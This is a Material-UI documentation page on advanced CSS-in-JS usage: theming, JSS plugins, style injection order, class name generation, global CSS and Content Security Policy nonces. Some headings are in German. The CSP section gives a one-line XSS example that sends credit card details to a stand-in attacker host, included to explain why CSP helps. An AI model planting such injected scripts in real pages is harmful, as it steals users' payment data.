# Advanced

<p class="description">Advanced Usage.</p>

## Theming

Add a `ThemeProvider` to the top level of your app to access the theme down the React's component tree. Then, you can access the theme object in the style functions.

{{"demo": "pages/css-in-js/advanced/Theming.js"}}

## Accessing the theme in a component

You might need to access the theme variables inside your React components.

### `useTheme` hook

{{"demo": "pages/css-in-js/advanced/UseTheme.js"}}

### `withTheme` HOC

{{"demo": "pages/css-in-js/advanced/WithTheme.js"}}

## Theme nesting

You can nest multiple theme providers. This can be really useful when dealing with different area of your application that have distinct appearance from each other.

```jsx
<ThemeProvider theme={outerTheme}>
  <Child1 />
  <ThemeProvider theme={innerTheme}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

{{"demo": "pages/css-in-js/advanced/ThemeNesting.js"}}

The inner theme will **override** the outer theme. You can extend the outer theme by providing a function:

```jsx
<ThemeProvider theme={…} >
  <Child1 />
  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

## JSS plugins

JSS uses the concept of plugins to extend its core, allowing people to cherry-pick the features they need. You pay the performance overhead for only what's you are using. All the plugins aren't available by default. We have added the following list:

- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)
- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)
- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)
- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)
- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)
- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)
- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)

It's a subset of [jss-preset-default](https://cssinjs.org/jss-preset-default/). Of course, you are free to add a new plugin. Here is an example with the [jss-rtl](https://github.com/alitaheri/jss-rtl) plugin.

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';
import rtl from 'jss-rtl'

const jss = create({
  plugins: [...jssPreset().plugins, rtl()],
});

function App() {
  return (
    <StylesProvider jss={jss}>
      ...
    </StylesProvider>
  );
}

export default App;
```

## String templates

If you prefer using the CSS syntax, you can use the [jss-plugin-template](https://cssinjs.org/jss-plugin-template) plugin.

```jsx
const useStyles = makeStyles({
  root: `
    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);
    border-radius: 3;
    border: 0;
    color: white;
    height: 48px;
    padding: 0 30px;
    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);
  `,
});
```

{{"demo": "pages/css-in-js/advanced/StringTemplates.js"}}

## CSS injection order

The CSS injected by Material-UI to style a component has the highest specificity possible as the `<link>` is injected at the bottom of the `<head>` to ensure the components always render correctly.

You might, however, also want to override these styles, for example with styled-components. If you are experiencing a CSS injection order issue, JSS [provides a mechanism](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) to handle this situation. By adjusting the placement of the `insertionPoint` within your HTML head you can [control the order](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) that the CSS rules are applied to your components.

### HTML-Kommentar

The simplest approach is to add an HTML comment that determines where JSS will inject the styles:

```jsx
<head>
  <!-- jss-insertion-point -->
  <link href="..." />
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const jss = create({
  ...jssPreset(),
  // We define a custom insertion point that JSS will look for injecting the styles in the DOM.
  insertionPoint: 'jss-insertion-point',
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

### Other HTML element

[Create React App](https://github.com/facebook/create-react-app) strips HTML comments when creating the production build. To get around the issue, you can provide a DOM element (other than a comment) as the JSS insertion point.

For example, a `<noscript>` element:

```jsx
<head>
  <noscript id="jss-insertion-point" />
  <link href="..." />
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const jss = create({
  ...jssPreset(),
  // We define a custom insertion point that JSS will look for injecting the styles in the DOM.
  insertionPoint: document.getElementById('jss-insertion-point'),
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

### JS createComment

codesandbox.io prevents the access to the `<head>` element. To get around the issue, you can use the JavaScript `document.createComment()` API:

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const styleNode = document.createComment('jss-insertion-point');
document.head.insertBefore(styleNode, document.head.firstChild);

const jss = create({
  ...jssPreset(),
  // We define a custom insertion point that JSS will look for injecting the styles in the DOM.
  insertionPoint: 'jss-insertion-point',
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

## Server Side Rendering

## Klassennamen

You may have noticed that the class names generated by our styling solution are **non-deterministic**, so you can't rely on them to stay the same. The class names are generated by [our class name generator](/css-in-js/api/#creategenerateclassname-options-class-name-generator) Let's take the following style as an example:

```jsx
const useStyles = makeStyles({
  root: {
    opacity: 1,
  },
}, {
  name: 'AppBar',
});
```

It will generate a `AppBar-root-5pbwdt` class name. However, the following CSS won't work:

```css
.AppBar-root-5pbwdt {
  opacity: 0.6;
}
```

You have to use the `classes` property of a component to override them. Thanks to the non-deterministic nature of our class names, we can implement optimizations for development and production. They are easy to debug in development and as short as possible in production:

- In **development**, the class name will be: `.AppBar-root-5pbwdt`, following this logic:

```js
const sheetName = 'AppBar';
const ruleName = 'root';
const identifier = 5pbwdt;

const className = `${sheetName}-${ruleName}-${identifier}`;
```

- In **production**, the class name will be: `.jss5pbwdt`, following this logic:

```js
const productionPrefix = 'jss';
const identifier = 5pbwdt;

const className = `${productionPrefix}-${identifier}`;
```

If you don't like this default behavior, you can change it. JSS basiert auf dem Konzept eines [Generators für Klassennamen](https://cssinjs.org/jss-api/#generate-your-class-names).

## Globales CSS

### `jss-plugin-global`

The [`jss-plugin-global`](#jss-plugins) plugin is installed in the default preset, you can use it to define global class names.

{{"demo": "pages/css-in-js/advanced/GlobalCss.js"}}

### Hybrid

You can also combine JSS generated class names with global ones.

{{"demo": "pages/css-in-js/advanced/HybridGlobalCss.js"}}

### Deterministic class names

We provide an option to make the class names **deterministic** with the [`dangerouslyUseGlobalCSS`](/css-in-js/api/#creategenerateclassname-options-class-name-generator) option. When turned on, the class names will look like this:

- development: `.AppBar-root`
- production: `.AppBar-root`

⚠️ **Be cautious when using `dangerouslyUseGlobalCSS`.** We provide this option as an escape hatch for prototyping. Relying on it for code running in production has the following implications:

- Global CSS is inherently fragile. People use strict methodologies like [BEM](http://getbem.com/introduction/) to workaround the issue.
- It's harder to keep track of `classes` API changes.

⚠️ When using `dangerouslyUseGlobalCSS` standalone (without Material-UI), you should name your style sheets using the `options` parameter:

```jsx
// Hook
const useStyles = makeStyles(styles, { name: 'button' });

// Styled-components
const Button = styled(styles, { name: 'button' })(ButtonBase);

// Higher-order component
const Button = withStyles(styles, { name: 'button' })(ButtonBase);
```

## Content Security Policy (CSP)

### What is CSP and why is it useful?

Basically, CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:

    <script>
      sendCreditCardDetails('https://hostile.example');
    </script>


This vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.

You can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

### How does one implement CSP?

In order to use CSP with Material-UI (and JSS), you need to use a nonce. A nonce is a randomly generated string that is only used once, therefore you need to add a server middleware to generate one on each request. JSS has a [great tutorial](https://github.com/cssinjs/jss/blob/next/docs/csp.md) on how to achieve this with Express and React Helmet. For a basic rundown, continue reading.

A CSP nonce is a Base 64 encoded string. You can generate one like this:

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

It is very important you use UUID version 4, as it generates an **unpredictable** string. You then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:

```js
header('Content-Security-Policy')
  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
```

If you are using Server Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: sheetsRegistry.toString() } }
/>
```

Then, you must pass this nonce to JSS so it can add it to subsequent `<style>` tags. The client side gets the nonce from a header. You must include this header regardless of whether or not SSR is used.

```jsx
<meta property="csp-nonce" content={nonce} />
```
